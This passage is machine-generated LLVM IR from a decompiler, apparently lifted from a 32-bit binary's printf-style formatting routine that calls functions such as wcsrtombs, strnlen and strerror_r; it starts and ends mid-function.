  %v3_804e371 = add i8 %v2_804e371, -48
  %v8_804e371 = icmp eq i8 %v3_804e371, 0
  %v9_804e371 = icmp slt i8 %v3_804e371, 0
  store i1 %v9_804e371, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804e371, label %dec_label_pc_804e381, label %dec_label_pc_804e37b

dec_label_pc_804e37b:                             ; preds = %dec_label_pc_804e371
  %v1_804e37b = add i32 %v2_804e33f, 128
  store i32 %v1_804e37b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e381

dec_label_pc_804e381:                             ; preds = %dec_label_pc_804e36d, %dec_label_pc_804e371, %dec_label_pc_804e368, %dec_label_pc_804e32f, %dec_label_pc_804e361, %dec_label_pc_804e37b
  %v0_804e3ba = phi i32 [ %v3_804e346, %dec_label_pc_804e36d ], [ 1, %dec_label_pc_804e371 ], [ %v3_804e346, %dec_label_pc_804e368 ], [ %v3_804e346, %dec_label_pc_804e32f ], [ %v3_804e346, %dec_label_pc_804e361 ], [ %v1_804e37b, %dec_label_pc_804e37b ]
  %v1_804e381 = inttoptr i32 %v0_804e381 to i8*
  %v2_804e381 = load i8, i8* %v1_804e381, align 1
  %v3_804e381 = add i8 %v2_804e381, -48
  %v8_804e381 = icmp eq i8 %v3_804e381, 0
  %v9_804e381 = icmp slt i8 %v3_804e381, 0
  store i1 %v9_804e381, i1* %sf.global-to-local, align 1
  %v1_804e384 = icmp eq i1 %v8_804e381, false
  br i1 %v1_804e384, label %dec_label_pc_804e3b2, label %dec_label_pc_804e386

dec_label_pc_804e386:                             ; preds = %dec_label_pc_804e381
  %v0_804e386 = load i32, i32* @ebp, align 4
  %v1_804e386 = add i32 %v0_804e386, -6
  %v6_804e386 = sub i32 5, %v0_804e386
  %v7_804e386 = and i32 %v6_804e386, %v0_804e386
  %v8_804e386 = icmp slt i32 %v7_804e386, 0
  %v10_804e386 = icmp slt i32 %v1_804e386, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804e38e = icmp eq i1 %v10_804e386, %v8_804e386
  %v5_804e38e = select i1 %v2_804e38e, i32 11, i32 %v0_804e386
  store i32 %v5_804e38e, i32* @ebp, align 4
  %v1_804e391 = add i32 %v0_804e391, 48
  %v2_804e391 = inttoptr i32 %v1_804e391 to i32*
  %v3_804e391 = load i32, i32* %v2_804e391, align 4
  %v4_804e391 = add i32 %v3_804e391, -1
  %v12_804e391 = icmp eq i32 %v4_804e391, 0
  %v13_804e391 = icmp slt i32 %v4_804e391, 0
  store i1 %v13_804e391, i1* %sf.global-to-local, align 1
  %v1_804e396 = icmp eq i1 %v12_804e391, false
  br i1 %v1_804e396, label %dec_label_pc_804e3a7, label %dec_label_pc_804e398

dec_label_pc_804e398:                             ; preds = %dec_label_pc_804e386
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8050bc0.114 to i32), i32* @edi, align 4
  br label %dec_label_pc_804e531

dec_label_pc_804e3a7:                             ; preds = %dec_label_pc_804e386
  %v1_804e3a7 = icmp eq i32 %v0_804e3ba, 0
  %v2_804e3a7 = icmp slt i32 %v0_804e3ba, 0
  store i1 %v2_804e3a7, i1* %sf.global-to-local, align 1
  %v1_804e3a9 = icmp eq i1 %v1_804e3a7, false
  br i1 %v1_804e3a9, label %dec_label_pc_804e3b2, label %dec_label_pc_804e3ab

dec_label_pc_804e3ab:                             ; preds = %dec_label_pc_804e3a7
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e531

dec_label_pc_804e3b2:                             ; preds = %dec_label_pc_804e3a7, %dec_label_pc_804e381
  %v2_804e3b2 = sub i32 %v0_804e3ba, %v1_804e341
  %v7_804e3b2 = icmp ult i32 %v0_804e3ba, %v1_804e341
  %v12_804e3b2 = icmp eq i32 %v2_804e3b2, 0
  %v13_804e3b2 = icmp slt i32 %v2_804e3b2, 0
  store i1 %v13_804e3b2, i1* %sf.global-to-local, align 1
  %v2_804e3b4 = or i1 %v7_804e3b2, %v12_804e3b2
  br i1 %v2_804e3b4, label %dec_label_pc_804e531, label %dec_label_pc_804e3ba

dec_label_pc_804e3ba:                             ; preds = %dec_label_pc_804e3b2
  store i1 %v13_804e3b2, i1* %sf.global-to-local, align 1
  store i32 %v2_804e3b2, i32* @ebx, align 4
  br label %dec_label_pc_804e54b

dec_label_pc_804e3c3:                             ; preds = %dec_label_pc_804e256
  %v1_804e3c3 = add i32 %v3_804e228, -15
  %v5_804e3c3 = icmp ult i32 %v3_804e228, 15
  %v9_804e3c3 = icmp eq i32 %v1_804e3c3, 0
  %v10_804e3c3 = icmp slt i32 %v1_804e3c3, 0
  store i1 %v10_804e3c3, i1* %sf.global-to-local, align 1
  %v2_804e3c6 = or i1 %v5_804e3c3, %v9_804e3c3
  br i1 %v2_804e3c6, label %dec_label_pc_804e3c8, label %dec_label_pc_804e40d

dec_label_pc_804e3c8:                             ; preds = %dec_label_pc_804e3c3
  %v1_804e3c8 = add i32 %v0_804e228.lcssa, 33
  %v2_804e3c8 = inttoptr i32 %v1_804e3c8 to i8*
  %v3_804e3c8 = load i8, i8* %v2_804e3c8, align 1
  %v4_804e3c8 = and i8 %v3_804e3c8, 8
  %v5_804e3c8 = icmp eq i8 %v4_804e3c8, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804e3cd = add i32 %v0_804e228.lcssa, 344
  %v2_804e3cd = inttoptr i32 %v1_804e3cd to i32*
  %v3_804e3cd = load i32, i32* %v2_804e3cd, align 4
  store i32 %v3_804e3cd, i32* %edx.global-to-local, align 4
  br i1 %v5_804e3c8, label %dec_label_pc_804e3da, label %dec_label_pc_804e3d6

dec_label_pc_804e3d6:                             ; preds = %dec_label_pc_804e3c8
  %v1_804e3d6 = inttoptr i32 %v3_804e3cd to x86_fp80*
  %v2_804e3d6 = load x86_fp80, x86_fp80* %v1_804e3d6, align 4
  br label %dec_label_pc_804e3dc

dec_label_pc_804e3da:                             ; preds = %dec_label_pc_804e3c8
  %v1_804e3da = inttoptr i32 %v3_804e3cd to double*
  %v2_804e3da = load double, double* %v1_804e3da, align 4
  %v3_804e3da = fpext double %v2_804e3da to x86_fp80
  br label %dec_label_pc_804e3dc

dec_label_pc_804e3dc:                             ; preds = %dec_label_pc_804e3d6, %dec_label_pc_804e3da
  %storemerge6 = phi x86_fp80 [ %v2_804e3d6, %dec_label_pc_804e3d6 ], [ %v3_804e3da, %dec_label_pc_804e3da ]
  store x86_fp80 %storemerge6, x86_fp80* %st0.global-to-local, align 4
  %v0_804e3dc = load i32, i32* @esi, align 4
  %v2_804e3dc = add i32 %v0_804e228.lcssa, -4
  %v3_804e3dc = inttoptr i32 %v2_804e3dc to i32*
  store i32 %v0_804e3dc, i32* %v3_804e3dc, align 4
  %v0_804e3dd = load i32, i32* @esi, align 4
  %v2_804e3dd = add i32 %v0_804e228.lcssa, -8
  %v3_804e3dd = inttoptr i32 %v2_804e3dd to i32*
  store i32 %v0_804e3dd, i32* %v3_804e3dd, align 4
  %v1_804e3de = add i32 %v0_804e228.lcssa, -12
  %v2_804e3de = inttoptr i32 %v1_804e3de to i32*
  store i32 134537374, i32* %v2_804e3de, align 4
  %v1_804e3e3 = add i32 %v0_804e228.lcssa, 20
  store i32 %v1_804e3e3, i32* %eax.global-to-local, align 4
  %v2_804e3e7 = add i32 %v0_804e228.lcssa, -16
  %v3_804e3e7 = inttoptr i32 %v2_804e3e7 to i32*
  store i32 %v1_804e3e3, i32* %v3_804e3e7, align 4
  %v1_804e3e8 = add i32 %v0_804e228.lcssa, -28
  %v10_804e3e8 = icmp slt i32 %v1_804e3e8, 0
  store i1 %v10_804e3e8, i1* %sf.global-to-local, align 1
  %v1_804e3eb = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e3eb = inttoptr i32 %v1_804e3e8 to x86_fp80*
  store x86_fp80 %v1_804e3eb, x86_fp80* %v3_804e3eb, align 4
  %v1_804e3ee = add i32 %v0_804e228.lcssa, 368
  %v2_804e3ee = inttoptr i32 %v1_804e3ee to i32*
  %v3_804e3ee = load i32, i32* %v2_804e3ee, align 4
  %v5_804e3ee = add i32 %v0_804e228.lcssa, -32
  %v6_804e3ee = inttoptr i32 %v5_804e3ee to i32*
  store i32 %v3_804e3ee, i32* %v6_804e3ee, align 4
  %v0_804e3f5 = call i32 @_fpmaxtostr()
  store i32 %v0_804e3f5, i32* %eax.global-to-local, align 4
  %v0_804e3fa = load i32, i32* @esp, align 4
  %v1_804e3fa = add i32 %v0_804e3fa, 32
  %v2_804e3fd = icmp slt i32 %v0_804e3f5, 0
  store i1 %v2_804e3fd, i1* %sf.global-to-local, align 1
  br i1 %v2_804e3fd, label %dec_label_pc_804e6ab, label %dec_label_pc_804e405

dec_label_pc_804e405:                             ; preds = %dec_label_pc_804e3dc
  %v1_804e405 = inttoptr i32 %v1_804e3fa to i32*
  %v2_804e405 = load i32, i32* %v1_804e405, align 4
  %v4_804e405 = add i32 %v2_804e405, %v0_804e3f5
  %v15_804e405 = icmp slt i32 %v4_804e405, 0
  store i1 %v15_804e405, i1* %sf.global-to-local, align 1
  store i32 %v4_804e405, i32* %v1_804e405, align 4
  %v0_804e698.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e698

dec_label_pc_804e40d:                             ; preds = %dec_label_pc_804e3c3
  %v1_804e40d = add i32 %v3_804e228, -17
  %v5_804e40d = icmp ult i32 %v3_804e228, 17
  %v9_804e40d = icmp eq i32 %v1_804e40d, 0
  %v10_804e40d = icmp slt i32 %v1_804e40d, 0
  store i1 %v10_804e40d, i1* %sf.global-to-local, align 1
  %v2_804e410 = or i1 %v5_804e40d, %v9_804e40d
  br i1 %v2_804e410, label %dec_label_pc_804e416, label %dec_label_pc_804e4aa

dec_label_pc_804e416:                             ; preds = %dec_label_pc_804e40d
  %v1_804e416 = add i32 %v0_804e228.lcssa, 332
  %v2_804e416 = inttoptr i32 %v1_804e416 to i32*
  store i32 0, i32* %v2_804e416, align 4
  %v0_804e421 = load i32, i32* @esp, align 4
  %v1_804e421 = add i32 %v0_804e421, 344
  %v2_804e421 = inttoptr i32 %v1_804e421 to i32*
  %v3_804e421 = load i32, i32* %v2_804e421, align 4
  store i32 %v3_804e421, i32* %edx.global-to-local, align 4
  %v1_804e428 = icmp eq i1 %v9_804e40d, false
  br i1 %v1_804e428, label %dec_label_pc_804e47a, label %dec_label_pc_804e42a

dec_label_pc_804e42a:                             ; preds = %dec_label_pc_804e416
  %v1_804e42a = inttoptr i32 %v3_804e421 to i32*
  %v2_804e42a = load i32, i32* %v1_804e42a, align 4
  store i32 %v2_804e42a, i32* %eax.global-to-local, align 4
  %v1_804e42c = icmp eq i32 %v2_804e42a, 0
  %v2_804e42c = icmp slt i32 %v2_804e42a, 0
  store i1 %v2_804e42c, i1* %sf.global-to-local, align 1
  %v2_804e42e = add i32 %v0_804e421, 340
  %v3_804e42e = inttoptr i32 %v2_804e42e to i32*
  store i32 %v2_804e42a, i32* %v3_804e42e, align 4
  br i1 %v1_804e42c, label %dec_label_pc_804e535, label %dec_label_pc_804e43b

dec_label_pc_804e43b:                             ; preds = %dec_label_pc_804e42a
  %v0_804e43b = load i32, i32* @esp, align 4
  %v1_804e43b = add i32 %v0_804e43b, 20
  %v2_804e43b = inttoptr i32 %v1_804e43b to i32*
  %v3_804e43b = load i32, i32* %v2_804e43b, align 4
  %v1_804e442 = add i32 %v0_804e43b, 340
  store i32 %v1_804e442, i32* %ecx.global-to-local, align 4
  %v2_804e449 = icmp slt i32 %v3_804e43b, 0
  store i1 %v2_804e449, i1* %sf.global-to-local, align 1
  %v1_804e44b = icmp eq i1 %v2_804e449, false
  %v4_804e44b = select i1 %v1_804e44b, i32 %v3_804e43b, i32 -1
  store i32 %v4_804e44b, i32* %edx.global-to-local, align 4
  %v1_804e44e = add i32 %v0_804e43b, 332
  store i32 %v1_804e44e, i32* %eax.global-to-local, align 4
  %v2_804e455 = add i32 %v0_804e43b, -4
  %v3_804e455 = inttoptr i32 %v2_804e455 to i32*
  store i32 %v1_804e44e, i32* %v3_804e455, align 4
  %v0_804e456 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e456 = add i32 %v0_804e43b, -8
  %v3_804e456 = inttoptr i32 %v2_804e456 to i32*
  store i32 %v0_804e456, i32* %v3_804e456, align 4
  %v0_804e457 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e457 = add i32 %v0_804e43b, -12
  %v3_804e457 = inttoptr i32 %v2_804e457 to i32*
  store i32 %v0_804e457, i32* %v3_804e457, align 4
  %v0_804e458 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e458 = add i32 %v0_804e43b, -16
  %v3_804e458 = inttoptr i32 %v2_804e458 to i32*
  store i32 %v0_804e458, i32* %v3_804e458, align 4
  %v0_804e459 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e459, i32* %eax.global-to-local, align 4
  %v0_804e45e = load i32, i32* @esp, align 4
  %v1_804e45e = add i32 %v0_804e45e, 16
  %v1_804e461 = add i32 %v0_804e459, 1
  %v10_804e461 = icmp eq i32 %v1_804e461, 0
  %v11_804e461 = icmp slt i32 %v1_804e461, 0
  store i1 %v11_804e461, i1* %sf.global-to-local, align 1
  store i32 %v0_804e459, i32* @esi, align 4
  br i1 %v10_804e461, label %dec_label_pc_804e6ab, label %dec_label_pc_804e46c

dec_label_pc_804e46c:                             ; preds = %dec_label_pc_804e43b
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e546

dec_label_pc_804e47a:                             ; preds = %dec_label_pc_804e416
  %v0_804e47a = load i32, i32* @ebx, align 4
  %v2_804e47a = add i32 %v0_804e421, -4
  %v3_804e47a = inttoptr i32 %v2_804e47a to i32*
  store i32 %v0_804e47a, i32* %v3_804e47a, align 4
  %v1_804e47b = add i32 %v0_804e421, 332
  store i32 %v1_804e47b, i32* %eax.global-to-local, align 4
  %v2_804e482 = add i32 %v0_804e421, -8
  %v3_804e482 = inttoptr i32 %v2_804e482 to i32*
  store i32 %v1_804e47b, i32* %v3_804e482, align 4
  %v0_804e483 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e483 = inttoptr i32 %v0_804e483 to i32*
  %v2_804e483 = load i32, i32* %v1_804e483, align 4
  %v4_804e483 = add i32 %v0_804e421, -12
  %v5_804e483 = inttoptr i32 %v4_804e483 to i32*
  store i32 %v2_804e483, i32* %v5_804e483, align 4
  %v1_804e485 = add i32 %v0_804e421, 204
  store i32 %v1_804e485, i32* @edi, align 4
  %v2_804e48c = add i32 %v0_804e421, -16
  %v3_804e48c = inttoptr i32 %v2_804e48c to i32*
  store i32 %v1_804e485, i32* %v3_804e48c, align 4
  %v0_804e48d = call i32 @__GI_wcrtomb()
  store i32 %v0_804e48d, i32* %eax.global-to-local, align 4
  %v0_804e492 = load i32, i32* @esp, align 4
  %v1_804e492 = add i32 %v0_804e492, 16
  %v1_804e495 = add i32 %v0_804e48d, 1
  %v10_804e495 = icmp eq i32 %v1_804e495, 0
  %v11_804e495 = icmp slt i32 %v1_804e495, 0
  store i1 %v11_804e495, i1* %sf.global-to-local, align 1
  store i32 %v0_804e48d, i32* @esi, align 4
  br i1 %v10_804e495, label %dec_label_pc_804e6ab, label %dec_label_pc_804e4a0

dec_label_pc_804e4a0:                             ; preds = %dec_label_pc_804e47a
  %v2_804e4a0 = add i32 %v0_804e48d, 220
  %v3_804e4a0 = add i32 %v2_804e4a0, %v0_804e492
  %v4_804e4a0 = inttoptr i32 %v3_804e4a0 to i8*
  store i8 0, i8* %v4_804e4a0, align 1
  br label %dec_label_pc_804e4d8

dec_label_pc_804e4aa:                             ; preds = %dec_label_pc_804e40d
  %v1_804e4aa = add i32 %v3_804e228, -19
  %v5_804e4aa = icmp ult i32 %v3_804e228, 19
  %v9_804e4aa = icmp eq i32 %v1_804e4aa, 0
  %v10_804e4aa = icmp slt i32 %v1_804e4aa, 0
  store i1 %v10_804e4aa, i1* %sf.global-to-local, align 1
  %v2_804e4ad = or i1 %v5_804e4aa, %v9_804e4aa
  br i1 %v2_804e4ad, label %dec_label_pc_804e4af, label %dec_label_pc_804e507

dec_label_pc_804e4af:                             ; preds = %dec_label_pc_804e4aa
  %v1_804e4af = add i32 %v0_804e228.lcssa, 344
  %v2_804e4af = inttoptr i32 %v1_804e4af to i32*
  %v3_804e4af = load i32, i32* %v2_804e4af, align 4
  store i32 %v3_804e4af, i32* %edx.global-to-local, align 4
  %v1_804e4b6 = icmp eq i1 %v9_804e4aa, false
  %v1_804e4e1 = inttoptr i32 %v3_804e4af to i32*
  %v2_804e4e1 = load i32, i32* %v1_804e4e1, align 4
  br i1 %v1_804e4b6, label %dec_label_pc_804e4e1, label %dec_label_pc_804e4b8

dec_label_pc_804e4b8:                             ; preds = %dec_label_pc_804e4af
  store i32 %v2_804e4e1, i32* @edi, align 4
  %v1_804e4ba = icmp eq i32 %v2_804e4e1, 0
  %v2_804e4ba = icmp slt i32 %v2_804e4e1, 0
  store i1 %v2_804e4ba, i1* %sf.global-to-local, align 1
  br i1 %v1_804e4ba, label %dec_label_pc_804e535, label %dec_label_pc_804e4be

dec_label_pc_804e4be:                             ; preds = %dec_label_pc_804e4b8, %dec_label_pc_804e510
  %v1_804e4c5 = phi i32 [ %v0_804e228.lcssa, %dec_label_pc_804e4b8 ], [ %v1_804e52a, %dec_label_pc_804e510 ]
  %v1_804e4be = add i32 %v1_804e4c5, 20
  %v2_804e4be = inttoptr i32 %v1_804e4be to i32*
  %v3_804e4be = load i32, i32* %v2_804e4be, align 4
  store i32 %v3_804e4be, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804e4c5 = add i32 %v1_804e4c5, -4
  %v3_804e4c5 = inttoptr i32 %v2_804e4c5 to i32*
  store i32 %v3_804e228, i32* %v3_804e4c5, align 4
  %v2_804e4c6 = add i32 %v1_804e4c5, -8
  %v3_804e4c6 = inttoptr i32 %v2_804e4c6 to i32*
  store i32 %v3_804e228, i32* %v3_804e4c6, align 4
  %v2_804e4c7 = icmp slt i32 %v3_804e4be, 0
  store i1 %v2_804e4c7, i1* %sf.global-to-local, align 1
  %v1_804e4c9 = icmp eq i1 %v2_804e4c7, false
  %v2_804e4c9 = load i32, i32* %eax.global-to-local, align 4
  %v4_804e4c9 = select i1 %v1_804e4c9, i32 %v3_804e4be, i32 %v2_804e4c9
  store i32 %v4_804e4c9, i32* %eax.global-to-local, align 4
  %v2_804e4cc = add i32 %v1_804e4c5, -12
  %v3_804e4cc = inttoptr i32 %v2_804e4cc to i32*
  store i32 %v4_804e4c9, i32* %v3_804e4cc, align 4
  %v0_804e4cd = load i32, i32* @edi, align 4
  %v2_804e4cd = add i32 %v1_804e4c5, -16
  %v3_804e4cd = inttoptr i32 %v2_804e4cd to i32*
  store i32 %v0_804e4cd, i32* %v3_804e4cd, align 4
  %v0_804e4ce = call i32 @strnlen()
  store i32 %v0_804e4ce, i32* %eax.global-to-local, align 4
  %v0_804e4d3 = load i32, i32* @esp, align 4
  %v1_804e4d3 = add i32 %v0_804e4d3, 16
  %v7_804e4d3 = icmp slt i32 %v1_804e4d3, 0
  store i1 %v7_804e4d3, i1* %sf.global-to-local, align 1
  store i32 %v0_804e4ce, i32* @esi, align 4
  br label %dec_label_pc_804e4d8

dec_label_pc_804e4d8:                             ; preds = %dec_label_pc_804e4a0, %dec_label_pc_804e4be
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e546

dec_label_pc_804e4e1:                             ; preds = %dec_label_pc_804e4af
  store i32 %v2_804e4e1, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804e4ef = add i32 %v0_804e228.lcssa, 204
  store i32 %v1_804e4ef, i32* @edi, align 4
  %v1_804e4f6 = add i32 %v0_804e228.lcssa, 205
  %v2_804e4f6 = inttoptr i32 %v1_804e4f6 to i8*
  store i8 0, i8* %v2_804e4f6, align 1
  %v0_804e4fe = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4fe = trunc i32 %v0_804e4fe to i8
  %v2_804e4fe = load i32, i32* @esp, align 4
  %v3_804e4fe = add i32 %v2_804e4fe, 204
  %v4_804e4fe = inttoptr i32 %v3_804e4fe to i8*
  store i8 %v1_804e4fe, i8* %v4_804e4fe, align 1
  br label %dec_label_pc_804e546

dec_label_pc_804e507:                             ; preds = %dec_label_pc_804e4aa
  %v1_804e507 = add i32 %v3_804e228, -20
  %v9_804e507 = icmp eq i32 %v1_804e507, 0
  %v10_804e507 = icmp slt i32 %v1_804e507, 0
  store i1 %v10_804e507, i1* %sf.global-to-local, align 1
  %v1_804e50a = icmp eq i1 %v9_804e507, false
  br i1 %v1_804e50a, label %dec_label_pc_804e6ab, label %dec_label_pc_804e510

dec_label_pc_804e510:                             ; preds = %dec_label_pc_804e507
  %v0_804e510 = load i32, i32* %stack_var_-364, align 4
  %v1_804e510 = call i32 @__errno_location(i32 %v0_804e510)
  store i32 %v1_804e510, i32* %eax.global-to-local, align 4
  %v0_804e515 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e515 = load i32, i32* @esp, align 4
  %v2_804e515 = add i32 %v1_804e515, -4
  %v3_804e515 = inttoptr i32 %v2_804e515 to i32*
  store i32 %v0_804e515, i32* %v3_804e515, align 4
  %v1_804e516 = add i32 %v1_804e515, -8
  %v2_804e516 = inttoptr i32 %v1_804e516 to i32*
  store i32 128, i32* %v2_804e516, align 4
  %v1_804e51b = add i32 %v1_804e515, 204
  store i32 %v1_804e51b, i32* %edx.global-to-local, align 4
  %v2_804e522 = add i32 %v1_804e515, -12
  %v3_804e522 = inttoptr i32 %v2_804e522 to i32*
  store i32 %v1_804e51b, i32* %v3_804e522, align 4
  %v1_804e523 = inttoptr i32 %v1_804e510 to i32*
  %v2_804e523 = load i32, i32* %v1_804e523, align 4
  %v4_804e523 = add i32 %v1_804e515, -16
  %v5_804e523 = inttoptr i32 %v4_804e523 to i32*
  store i32 %v2_804e523, i32* %v5_804e523, align 4
  %v0_804e525 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e525, i32* %eax.global-to-local, align 4
  %v0_804e52a = load i32, i32* @esp, align 4
  %v1_804e52a = add i32 %v0_804e52a, 16
  %v7_804e52a = icmp slt i32 %v1_804e52a, 0
  store i1 %v7_804e52a, i1* %sf.global-to-local, align 1
  store i32 %v0_804e525, i32* @edi, align 4
  br label %dec_label_pc_804e4be

dec_label_pc_804e531:                             ; preds = %dec_label_pc_804e3b2, %dec_label_pc_804e3ab, %dec_label_pc_804e398
  %v0_804e54e36 = phi i32 [ %v1_804e341, %dec_label_pc_804e3b2 ], [ 0, %dec_label_pc_804e3ab ], [ 5, %dec_label_pc_804e398 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e54b

dec_label_pc_804e535:                             ; preds = %dec_label_pc_804e4b8, %dec_label_pc_804e42a
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050bc6.115 to i32), i32* @edi, align 4
  br label %dec_label_pc_804e546

dec_label_pc_804e546:                             ; preds = %dec_label_pc_804e4e1, %dec_label_pc_804e4d8, %dec_label_pc_804e46c, %dec_label_pc_804e535
  %v0_804e546 = load i32, i32* @esp, align 4
  %v1_804e546 = add i32 %v0_804e546, 7
  %v2_804e546 = inttoptr i32 %v1_804e546 to i8*
  store i8 32, i8* %v2_804e546, align 1
  %v0_804e54e.pre = load i32, i32* @esi, align 4
  %v1_804e54e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e54b

dec_label_pc_804e54b:                             ; preds = %dec_label_pc_804e531, %dec_label_pc_804e3ba, %dec_label_pc_804e546
  %v1_804e54e = phi i32 [ 0, %dec_label_pc_804e531 ], [ %v2_804e3b2, %dec_label_pc_804e3ba ], [ %v1_804e54e.pre, %dec_label_pc_804e546 ]
  %v0_804e54e = phi i32 [ %v0_804e54e36, %dec_label_pc_804e531 ], [ %v1_804e341, %dec_label_pc_804e3ba ], [ %v0_804e54e.pre, %dec_label_pc_804e546 ]
  %v0_804e54b = load i32, i32* @ebp, align 4
  %v1_804e54b = add i32 %v0_804e54b, -11
  %v9_804e54b = icmp eq i32 %v1_804e54b, 0
  %v10_804e54b = icmp slt i32 %v1_804e54b, 0
  store i1 %v10_804e54b, i1* %sf.global-to-local, align 1
  %v2_804e54e = add i32 %v0_804e54e, %v1_804e54e
  store i32 %v2_804e54e, i32* @edx, align 4
  br i1 %v9_804e54b, label %dec_label_pc_804e55f, label %dec_label_pc_804e553

dec_label_pc_804e553:                             ; preds = %dec_label_pc_804e54b
  %v1_804e555 = add i32 %v0_804e54b, -5
  %v6_804e555 = sub i32 4, %v0_804e54b
  %v7_804e555 = and i32 %v6_804e555, %v0_804e54b
  %v8_804e555 = icmp slt i32 %v7_804e555, 0
  %v9_804e555 = icmp eq i32 %v1_804e555, 0
  %v10_804e555 = icmp slt i32 %v1_804e555, 0
  store i1 %v10_804e555, i1* %sf.global-to-local, align 1
  %v3_804e558 = icmp eq i1 %v10_804e555, %v8_804e555
  %v4_804e558 = icmp eq i1 %v9_804e555, false
  %v5_804e558 = and i1 %v4_804e558, %v3_804e558
  %v6_804e558 = zext i1 %v5_804e558 to i32
  store i32 %v6_804e558, i32* %eax.global-to-local, align 4
  %v2_804e55b = add i32 %v2_804e54e, 1
  %v3_804e55b = add i32 %v2_804e55b, %v6_804e558
  store i32 %v3_804e55b, i32* @edx, align 4
  br label %dec_label_pc_804e55f

dec_label_pc_804e55f:                             ; preds = %dec_label_pc_804e54b, %dec_label_pc_804e553
  %v0_804e55f = load i32, i32* @esp, align 4
  %v1_804e55f = add i32 %v0_804e55f, 24
  %v2_804e55f = inttoptr i32 %v1_804e55f to i32*
  %v3_804e55f = load i32, i32* %v2_804e55f, align 4
  store i32 %v3_804e55f, i32* %eax.global-to-local, align 4
  %v1_804e563 = add i32 %v0_804e55f, 8
  %v2_804e563 = inttoptr i32 %v1_804e563 to i32*
  store i32 0, i32* %v2_804e563, align 4
  %v0_804e56b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e56b = load i32, i32* @edx, align 4
  %v2_804e56b = sub i32 %v0_804e56b, %v1_804e56b
  %v7_804e56b = icmp ult i32 %v0_804e56b, %v1_804e56b
  %v12_804e56b = icmp eq i32 %v2_804e56b, 0
  %v13_804e56b = icmp slt i32 %v2_804e56b, 0
  store i1 %v13_804e56b, i1* %sf.global-to-local, align 1
  %v2_804e56d = or i1 %v7_804e56b, %v12_804e56b
  br i1 %v2_804e56d, label %dec_label_pc_804e575, label %dec_label_pc_804e56f

dec_label_pc_804e56f:                             ; preds = %dec_label_pc_804e55f
  store i1 %v13_804e56b, i1* %sf.global-to-local, align 1
  store i32 %v2_804e56b, i32* %eax.global-to-local, align 4
  %v1_804e571 = load i32, i32* @esp, align 4
  %v2_804e571 = add i32 %v1_804e571, 8
  %v3_804e571 = inttoptr i32 %v2_804e571 to i32*
  store i32 %v2_804e56b, i32* %v3_804e571, align 4
  %v0_804e579.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e575

dec_label_pc_804e575:                             ; preds = %dec_label_pc_804e55f, %dec_label_pc_804e56f
  %v0_804e579 = phi i32 [ %v1_804e56b, %dec_label_pc_804e55f ], [ %v0_804e579.pre, %dec_label_pc_804e56f ]
  %v0_804e575 = load i32, i32* @esp, align 4
  %v1_804e575 = add i32 %v0_804e575, 8
  %v2_804e575 = inttoptr i32 %v1_804e575 to i32*
  %v3_804e575 = load i32, i32* %v2_804e575, align 4
  store i32 %v3_804e575, i32* @ecx, align 4
  %v2_804e579 = add i32 %v3_804e575, %v0_804e579
  store i32 %v2_804e579, i32* %eax.global-to-local, align 4
  %v1_804e57c = inttoptr i32 %v0_804e575 to i32*
  %v2_804e57c = load i32, i32* %v1_804e57c, align 4
  %v4_804e57c = add i32 %v2_804e57c, %v2_804e579
  %v15_804e57c = icmp slt i32 %v4_804e57c, 0
  store i1 %v15_804e57c, i1* %sf.global-to-local, align 1
  store i32 %v4_804e57c, i32* %v1_804e57c, align 4
  %v0_804e57f = load i32, i32* @esp, align 4
  %v1_804e57f = add i32 %v0_804e57f, 7
  %v2_804e57f = inttoptr i32 %v1_804e57f to i8*
  %v3_804e57f = load i8, i8* %v2_804e57f, align 1
  %v4_804e57f = add i8 %v3_804e57f, -48
  %v9_804e57f = icmp eq i8 %v4_804e57f, 0
  %v10_804e57f = icmp slt i8 %v4_804e57f, 0
  store i1 %v10_804e57f, i1* %sf.global-to-local, align 1
  %v1_804e584 = icmp eq i1 %v9_804e57f, false
  br i1 %v1_804e584, label %dec_label_pc_804e590, label %dec_label_pc_804e586

dec_label_pc_804e586:                             ; preds = %dec_label_pc_804e575
  %v0_804e586 = load i32, i32* @ebx, align 4
  %v1_804e586 = load i32, i32* @ecx, align 4
  %v2_804e586 = add i32 %v1_804e586, %v0_804e586
  %v13_804e586 = icmp slt i32 %v2_804e586, 0
  store i1 %v13_804e586, i1* %sf.global-to-local, align 1
  store i32 %v2_804e586, i32* @ebx, align 4
  %v1_804e588 = add i32 %v0_804e57f, 8
  %v2_804e588 = inttoptr i32 %v1_804e588 to i32*
